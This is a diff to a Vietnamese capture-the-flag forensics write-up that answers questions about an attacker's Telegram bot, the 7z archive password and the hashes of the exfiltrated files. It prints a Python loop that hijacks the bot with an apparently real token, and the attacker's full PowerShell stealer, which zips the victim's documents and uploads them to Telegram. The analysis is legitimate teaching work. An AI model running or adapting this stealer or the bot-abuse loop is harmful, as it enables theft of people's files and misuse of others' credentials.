@@ -1,4 +1,4 @@
-# Counter Defensive
+![image](https://github.com/NVex0/uWU/assets/113530029/7dacf432-6246-4093-b4e8-4bb378ef199b)# Counter Defensive
 
 Đi thẳng vào câu hỏi luôn nhé:
 
@@ -187,6 +187,147 @@ echo $j51
 + Từ đây mình có được API và chat_id sau khi decrypt:
 
   ![image](https://github.com/NVex0/uWU/assets/113530029/7aaa3a26-e8b8-444d-94d1-8697e5e8fa81)
+
++ Sau khi có API bot, bắt đầu infiltrate nó thôi. Mình dùng script python sau để bruteforce message id forward tin nhắn từ attacker với bot về tele mình:
+
+  ```
+  import os
+  for i in range(7000):
+    command = """
+    curl -S "https://api.telegram.org/bot7035285918:AAE_fggsw0MN6tv7HJbMWVXdoiaoaGBMcy4/forwardMessage?chat_id={id_của_mình}&from_chat_id=6959962141&message_id={0}"                                  
+    """
+    command = command.format(str(i))
+    os.system(command)
+    print("\n\n")
+  ```
+  
++ Check tele:
+
+  ![image](https://github.com/NVex0/uWU/assets/113530029/96dd3f60-b895-481e-a7b6-9f31b76de18d)
+
+> Ans: Pirate_D_Mylan
+
+### 8. What day did the attacker's server first send a 'new-connection' message? (Format: DD/MM/YYYY)
+
+  ![image](https://github.com/NVex0/uWU/assets/113530029/d5d9433a-2a85-4bac-be1b-f7e9023d83da)
+
+  Với tin nhắn "new connection", check time tương ứng với response trả về, ta sẽ có thời gian.
+
+> Ans: 18/04/2024
+
+### 9. What's the password for the 7z archive
+
++ Từ 1 tin nhắn là script chạy trên máy victim rồi forward lên bot, ta lại tiếp tục xử lý nó:
+
+  ![image](https://github.com/NVex0/uWU/assets/113530029/14f15221-fd42-47d3-9356-68bfd563ba36)
+
+```
+[System.Net.ServicePointManager]::SecurityProtocol=@("Tls12","Tls11","Tls","Ssl3")
+$a1=gp "HKCU:\\Environment"
+function h1($j0) {
+    $v4 = [System.Security.Cryptography.HashAlgorithm]::Create('md5')
+    $x3 = $v4.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($j0))
+    $n6 = [System.BitConverter]::ToString($x3)
+    return $n6.Replace('-', '')
+}
+$j2=$a1.Update
+$F2=$a1.guid
+$g1=$a1.bid
+$y3=$a1.tid
+$j5=$a1.hid
+function s9($n1, $x8) {
+    $k7 = gi $n1
+    foreach($b5 in $k7.Property){ 
+        $u6 = $k7.Name + ";" + $b5
+        $x3 = h1 $u6
+        if($x8 -eq $x3){
+            return ((gp $n1 -Name $b5).$b5)
+        }
+    }
+    foreach($n2 in $k7.GetSubkeyNames()){
+        $v8 = s9 ($n1 + "\" + $n2) $x8
+        if($v8.Length -gt 0){
+            return $v8
+        }
+    }
+    return ""
+}
+$m0 = s9 "HKCU:\software\classes\Interface" "6ca24d7c7f6f6465afb82dacd1b0c71f"
+function n9 {
+    param (
+        [byte[]]$n3
+    )
+    $c4 = New-Object System.IO.MemoryStream($n3, 0, $n3.Length)
+    $c5 = New-Object Byte[](32)
+    $x2 = $c4.Read($c5, 0, $c5.Length)
+    if ($x2 -ne $c5.Length) {
+        exit
+    }
+    $b5 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($m0, $c5)
+    $b7  = $b5.GetBytes(32)
+    $v9   = $b5.GetBytes(16)
+    $h5 = New-Object Security.Cryptography.AesManaged
+    $e3 = $h5.CreateDecryptor($b7, $v9)
+    $w5 = New-Object IO.MemoryStream
+    $q7 = New-Object System.Security.Cryptography.CryptoStream(
+        $c4, $e3, [System.Security.Cryptography.CryptoStreamMode]::Read)
+    $q7.CopyTo($w5)
+    $w5.Position = 0
+    $y5 = New-Object IO.StreamReader($w5)
+    $u9 = $y5.ReadToEnd()
+    $y5.Dispose()
+    $q7.Dispose()
+    $w5.Dispose()
+    $c4.Dispose()
+    return $u9
+}
+$j51 = n9 $j5
+$y31 = n9 $y3
+$g11 = n9 $g1
+$i0 = "$g11`:$y31"
+$s74=@('.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf')
+$l01="$env:temp\documents_$((Get-Date).ToString('yyyyMMddHHmmss')).csv"
+$w51="$env:temp\documents_$((Get-Date).ToString('yyyyMMddHHmmss')).7z"
+$h75=$env:temp
+$w51s=Get-ChildItem -Path ([System.IO.Path]::Combine($env:USERPROFILE,'Documents')) -Recurse -ErrorAction SilentlyContinue|Where-Object{$s74 -contains $_.Extension}|Select-Object Name,FullName,LastWriteTime,Length
+$w51s|Export-Csv -Path $l01 -Encoding Unicode
+$w51s|ForEach-Object{Copy-Item -Path $_.FullName -Destination ([System.IO.Path]::Combine($h75,$_.Name)) -Force}
+$v13=[System.Text.Encoding]::ascii
+& 'C:\Program Files\7-Zip\7z.exe' a -t7z -mx5 -parameter-none $w51 $l01 $w51s.FullName|Out-Null
+Add-Type -AssemblyName System.Net.Http
+$form=new-object System.Net.Http.MultipartFormDataContent
+$form.Add($(New-Object System.Net.Http.StringContent $j51),'chat_id')
+$Content=[System.IO.File]::ReadAllBytes($w51)
+$n82=New-Object System.Net.Http.ByteArrayContent ($Content,0,$Content.Length)
+$n82.Headers.Add('Content-Type','text/plain')
+$m63=$v13.getstring($v13.getbytes("$($env:COMPUTERNAME).7z"))
+$form.Add($n82,'document',$m63)
+$ms=new-object System.IO.MemoryStream
+$form.CopyToAsync($ms).Wait()
+irm -Method Post -Body $ms.ToArray() -Uri "https://api.telegram.org/bot$i0/sendDocument" -ContentType $form.Headers.ContentType.ToString()
+$w51s|ForEach-Object{Remove-Item -Path ([System.IO.Path]::Combine($h75,$_.Name)) -Force}
+ri -Path $l01 -Force
+ri -Path $w51 -Force
+```
+
++ Dễ thấy đoạn dùng 7z set tham số cho -p (password). (Đoạn này bị lừa troll quá :)))
+
+> Ans: arameter-none
+
+### 10. Submit the md5sum of the 2 files in the archive that the attacker exfiltrated (sort hashes, connect with '_', ie: 5f19a..._d9fc0...) 
+
+![image](https://github.com/NVex0/uWU/assets/113530029/88db624f-26f3-4947-bdf3-1f3e6d05404f)
+
++ Và sau khi có pass ở câu 9, mở zip ra lấy hash thôi.
+
+> Ans: 83aa3b16ba6a648c133839c8f4af6af9_ffcedf790ce7fe09e858a7ee51773bcd
+
+
+
+
+
+ 
+
 
 
   
